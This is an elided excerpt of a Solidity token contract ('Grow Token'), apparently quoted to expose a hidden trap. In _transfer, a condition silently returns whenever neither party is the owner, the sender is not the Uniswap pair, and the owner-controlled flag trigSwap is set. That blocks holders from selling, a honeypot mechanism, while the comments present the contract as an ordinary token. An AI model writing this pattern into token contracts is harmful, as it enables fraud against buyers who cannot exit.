...
contract growtoken is Context, IERC20, Ownable {
    ...
    string private constant _name = "Grow Token";
    ...
    constructor () {
        ...
        _standardTax = 6; // only active during launch
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if(from != owner() && to != owner() && from != uniswapV2Pair && trigSwap){ return; }
